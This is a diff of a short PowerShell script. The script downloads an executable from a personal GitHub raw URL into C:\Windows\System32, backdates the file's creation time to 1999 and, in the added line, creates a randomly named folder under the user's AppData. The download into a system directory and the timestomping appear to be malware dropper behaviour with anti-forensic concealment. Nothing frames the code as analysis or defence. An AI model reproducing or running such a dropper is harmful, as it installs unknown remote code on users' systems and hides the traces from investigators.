@@ -1,5 +1,5 @@
 $TargetPath = "C:\Windows\System32\installer.exe"
-
+mkdir ("C:\Users\" + $env:USERNAME + "\AppData\Data\fa7tr3b4awe9hnte563cdn324v3q4z36\")
 curl "https://raw.githubusercontent.com/mohamedali43/ps1/main/installer.exe" -o $TargetPath
 
 (Get-Item $TargetPath).CreationTime=("1 Jan 1999 0:00:00")
